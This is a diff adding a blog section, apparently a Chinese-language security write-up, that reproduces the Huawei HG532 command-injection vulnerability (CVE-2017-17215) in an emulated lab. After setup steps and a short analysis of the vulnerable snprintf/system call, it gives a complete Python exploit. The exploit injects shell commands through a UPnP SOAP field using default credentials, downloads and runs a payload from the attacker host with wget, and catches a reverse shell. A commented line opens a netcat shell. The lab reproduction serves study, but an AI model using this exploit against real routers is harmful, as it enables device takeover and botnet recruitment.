@@ -242,7 +242,81 @@ session.post(url, headers=header)</code></pre>
 
 
 
+<h1 id="华为-HG532-远程代码执行漏洞（CVE-2017-17215）"><a href="#华为-HG532-远程代码执行漏洞（CVE-2017-17215）" class="headerlink" title="华为 HG532 远程代码执行漏洞（CVE-2017-17215）"></a>华为 HG532 远程代码执行漏洞（CVE-2017-17215）</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/15613816.html">漏洞分析：CVE-2017-17215 - Riv4ille - 博客园 (cnblogs.com)</a></p>
+<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul>
+<li>docker：攻击、调试主机：192.168.2.1</li>
+<li>qemu-system：固件主机：192.168.2.2</li>
+<li>uhttpd（有漏洞 Web 服务器）：192.168.2.2:80</li>
+<li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mips</code></li>
+</ul>
+<h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p>
+<blockquote>
+<p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;HG532eV100R001C01B020_upgrade_packet.bin”</p>
+</blockquote>
+<p>固件分析 32位 mips架构 小端序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261004016.png" alt="image-20240626100451970"></p>
+<p>剩下步骤与TOTOLINK NR1800X相同，本地构建qemu-system镜像，然后构建漏洞环境，启动环境</p>
+<blockquote>
+<p>#到squashfs-root所在目录</p>
+<p>cp -r .&#x2F;squashfs-root&#x2F; ..&#x2F;</p>
+<p>#改Dockerfile文件目录</p>
+<p>#构建本地qemu-system镜像</p>
+<p>docker build -t firmianay&#x2F;qemu-system:mips .</p>
+<p>docker-compose -f docker-compose-system.yml build</p>
+<p>docker-compose -f docker-compose-system.yml up</p>
+</blockquote>
+<p>使用ssh设置socks 代理后，配置浏览器代理，然后登陆 Web 后台 <a target="_blank" rel="noopener" href="http://192.168.2.2/%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8A%A5%E9%94%99">http://192.168.2.2/，服务端报错</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260004775.png" alt="image-20240625234908598"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260909274.png" alt="image-20240626090924119"></p>
+<p>本地代理连接测试，成功连接到了192.168.2.2并且重定向到<a target="_blank" rel="noopener" href="https://192.168.2.2/">https://192.168.2.2</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260912255.png" alt="image-20240626091219207"></p>
+<p>测试https连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260914069.png" alt="image-20240626091406016"></p>
+<p>发现是接收到了SSL证书错误，添加-k选项，忽略SSL证书验证</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260916879.png" alt="image-20240626091654813"></p>
+<p>成功访问服务！</p>
+<p><img src="C:/Users/1i/AppData/Roaming/Typora/typora-user-images/image-20240626094931147.png" alt="image-20240626094931147"></p>
+<p>照着文档打通了<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260045636.png" alt="image-20240626004523543"></p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>详细的控制流分析以及UPnP协议的学习有些心有余而力不足了</p>
+<p>简单分析一下upnp里面的关键漏洞代码</p>
+<p><img src="C:/Users/1i/AppData/Roaming/Typora/typora-user-images/image-20240626101528081.png" alt="image-20240626101528081"></p>
+<p>这里调用了snprintf(a0, a1, a2, a3)</p>
+<p>即snprintf(a0, 0x400, “upg -g -U %s -t ‘1 Firmware Upgrade Ima”, a3)</p>
+<p>a0源操作数，a1为size，a2为格式化字符，a3为指定格式化的数据</p>
+<p>a0又是snprintf的源操作数，也是system调用的参数，最后会执行system(a0)</p>
+<p>exp:最终执行cmd</p>
+<pre><code class="highlight python"><span class="comment">#!/usr/bin/python3</span>
 
+<span class="keyword">import</span> requests
+<span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> threading <span class="keyword">import</span> Thread
+
+<span class="comment"># cmd = &quot;busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh&quot;</span>
+cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span>
+cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
+cmd += <span class="string">&#x27;/msf&#x27;</span>
+
+<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)
+
+data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n    &lt;s:Envelope xmlns:s=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; s:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\&quot;urn:schemas-upnp-org:service:WANPPPConnection:1\&quot;&gt;\n    &lt;NewStatusURL&gt;$(&quot;</span> + cmd + <span class="string">&quot;)&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;&quot;</span>
+url = <span class="string">&quot;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&quot;</span>
+
+<span class="keyword">def</span> <span class="title function_">attack</span>():
+    <span class="keyword">try</span>:
+        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="built_in">print</span>(e)
+
+thread = Thread(target=attack)
+thread.start()
+
+io = listen(<span class="number">31337</span>)
+io.wait_for_connection()
+log.success(<span class="string">&quot;getshell&quot;</span>)
+io.interactive()
+
+thread.join()</code></pre>
 
 
 
